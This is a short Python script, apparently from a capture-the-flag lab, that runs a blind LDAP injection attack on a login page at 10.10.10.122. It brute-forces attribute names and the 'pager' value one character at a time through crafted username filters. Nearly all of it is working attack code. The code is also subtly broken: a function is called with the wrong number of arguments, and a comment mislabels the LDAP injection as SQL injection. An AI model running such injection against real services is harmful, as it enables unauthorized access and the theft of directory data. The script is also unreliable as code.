#!/usr/bin/python3

# for ((i=32;i<127;i++)) do printf "\\$(printf %03o "$i")"; done; printf "\n"   -> print all characters of the ascii table

import requests

postUrl = 'http://10.10.10.122/login.php'
chars = '!#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'

# This is the message we want to see for a successful injection
errorMsg = 'not found'

# Perform the blind sql injection
def findAttribute(character):
    return f'ldapuser)({character}=*)'
###

def findAttributeValue(character):
    return f'ldapuser)(pager={character})'
###

for i in range(1,150):
    for c in chars:
        ldapi = findAttribute(i, c)

        # The post parameters
        payload = {'inputUsername':ldapi, 'inputOTP':'x'}

        # The actual POST request
        r = requests.post(postUrl, data = payload)
        
        if errorMsg in r.text:
            print(c, end='', flush=True)
            break
        ###

    ###
###
print()
